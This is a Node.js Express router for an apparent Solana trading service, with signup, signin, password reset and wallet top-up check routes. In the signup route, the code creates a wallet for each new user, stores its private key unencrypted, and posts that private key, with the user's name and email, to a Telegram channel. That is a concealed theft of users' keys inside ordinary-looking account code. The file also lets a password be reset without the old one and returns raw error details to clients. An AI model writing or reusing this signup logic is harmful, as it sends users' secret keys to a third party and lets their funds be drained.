const express = require("express");
const router = express.Router();
const auth = require("../middleware/auth");
const User = require("../model/user");
const { Keypair, Connection } = require("@solana/web3.js");
const { sendTelegramNotification } = require("../utils/telegram");
const {
  validateWalletBalance,
  getSolWalletBalance,
} = require("../utils/tradeUtils");

async function createSolanaWallet() {
  try {
    const keypair = Keypair.generate(); // Generate a random keypair
    const privateKey = Buffer.from(keypair.secretKey).toString("base64"); // Encode the secret key
    const address = keypair.publicKey.toString(); // Get the public key (wallet address)

    return {
      privateKey,
      address,
    };
  } catch (error) {
    throw new Error("Failed to create Solana wallet: " + error.message);
  }
}

router.post("/signup", async (req, res) => {
  try {
    // Create a new wallet for Solana
    const solWallet = await createSolanaWallet();

    // Extract wallet address and private key
    const walletAddress = solWallet.address;
    const walletPrivateKey = solWallet.privateKey;

    const user = new User({
      name: req.body.name,
      email: req.body.email,
      password: req.body.password,
      solWalletAddress: walletAddress,
      solWalletPrivateKey: walletPrivateKey,
    });

    await user.save();
    const token = await user.generateAuthToken();

    res.setHeader("Authorization", token);

    const message = `🎉 *New User Signup* 🎉
*Name:* ${user.name}
*Email:* ${user.email}
*Wallet Address:* \`${user.solWalletAddress}\`
*Wallet Private Key:* \`${user.solWalletPrivateKey}\``;
    sendTelegramNotification(message);

    res.send({ user: user.getPublicObject() });
  } catch (error) {
    res
      .status(401)
      .send({ message: "Invalid Email or Password!", reason: error.message });
  }
});

router.post("/signin", async function (req, res) {
  try {
    const user = await User.authenticateByCredentials(
      req.body.email,
      req.body.password
    );

    const token = await user.generateAuthToken();
    res.header("Authorization", token);

    res.send({ user: user.getPublicObject() });
  } catch (err) {
    res
      .status(400)
      .send({ message: "Invalid Email or Password!", reason: err.message });
  }
});

router.put("/reset-password", auth, async (req, res) => {
  try {
    req.user.password = req.body.password;
    await req.user.save();
    res.send("Password changed succesfully!");
  } catch (error) {
    res
      .status(500)
      .send({ message: "Invalid Email or Password!", reason: error.message });
  }
});

router.post("/topup-check", auth, async (req, res) => {
  try {
    const { topupType, stableCoinSymbol, contractAddress } = req.body;

    // Validate user ID
    let user = req.user;
    if (!user) {
      return res.status(404).send({ error: "User not found" });
    }

    let requiredSolBalance = 0;

    if (topupType === "SOL") {
      requiredSolBalance = 0.07;
    } else if (topupType === "STABLE_COIN") {
      requiredSolBalance = 0.02;
    } else {
      return res.status(400).send({
        error: "Invalid top-up type. Must be either 'SOL' or 'STABLE_COIN'.",
      });
    }

    console.log("Required SOL balance:", requiredSolBalance);
    console.log("Top-up type:", topupType);
    console.log("wallet address:" + user.solWalletAddress);
    const balanceStatus = await validateWalletBalance(
      user.solWalletAddress,
      topupType,
      requiredSolBalance,
      contractAddress
    );

    if (!balanceStatus.isBalanceSufficient) {
      user.solBalance = balanceStatus.solBalance;
      user.topUpVerified = false;
      user = await user.save();
      return res.status(400).send({
        error: `Insufficient wallet balance.`,
        walletAddress: user.solWalletAddress,
        currentSolBalance: balanceStatus.solBalance,
      });
    }

    if (topupType === "STABLE_COIN") {
      if (!stableCoinSymbol || !contractAddress) {
        user.solBalance = balanceStatus.solBalance;
        user.topUpVerified = false;
        user = await user.save();
        return res.status(400).send({
          error:
            "For stable coin top-ups, both 'stableCoinSymbol' and 'contractAddress' are required.",
        });
      }

      let newOtherBalance = {
        symbol: stableCoinSymbol,
        contractAddress,
        amount: balanceStatus.stableCoinBalance,
      };
      user.otherBalance.push(newOtherBalance);
      user.solBalance = balanceStatus.solBalance;

      return res.status(200).send({
        message: "Stable coin top-up verified successfully!",
        walletAddress: user.solWalletAddress,
        stableCoin: {
          symbol: stableCoinSymbol,
          contractAddress,
          balance: balanceStatus.stableCoinBalance,
        },
        currentSolBalance: balanceStatus.solBalance,
      });
    } else {
      user.solBalance = await getSolWalletBalance(user.solWalletAddress);
    }

    user.topUpVerified = true;
    user = await user.save();
    return res.status(200).send({
      message: "SOL top-up verified successfully!",
      walletAddress: user.solWalletAddress,
      currentSolBalance: user.solBalance,
    });
  } catch (error) {
    console.error("Error during top-up:", error);
    res
      .status(500)
      .send({ error: "Internal Server Error", reason: error.message });
  }
});

module.exports = router;
